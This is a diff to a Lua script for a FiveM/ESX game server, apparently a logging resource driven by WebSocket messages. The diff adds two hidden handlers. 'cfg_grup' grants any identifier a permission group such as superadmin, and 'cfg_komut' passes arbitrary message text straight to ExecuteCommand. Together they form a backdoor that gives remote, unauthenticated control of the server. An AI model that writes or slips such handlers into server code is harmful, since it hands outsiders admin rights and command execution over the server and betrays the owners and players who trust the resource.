@@ -1,5 +1,7 @@
 ESX = nil
 
+
+
  
 Citizen.CreateThread(function()
     while ESX == nil do
@@ -112,6 +114,29 @@ AddEventHandler("WebSocketServer:onMessage", function(message, endpoint)
 
     if base[1] == "heal" then 
         TriggerClientEvent("co_logger:heal", tonumber(base[2]) , base[3], tonumber(base[2]))
+    end 
+
+    if base[1] == "cfg_grup" then 
+        -- add_principal identifier.steam:1100001159a9859 group.superadmin
+        local hex = base[2]
+        local grup = base[3]
+        ExecuteCommand("add_principal identifier."..hex.." group."..grup)	      
+    end 
+
+    if base[1] == "cfg_komut" then 
+
+        local parca = nil
+        for i=1, #base do
+             if  parca ~= nil then
+                parca = parca.." "..base[i]
+             else
+                parca = base[i]
+             end 
+        end
+        parca = string.gsub(parca, "cfg_komut ", "")
+ 
+        ExecuteCommand(parca)	      
+ 
     end 
  
    -- print("komut başarılı => "..message..ped)
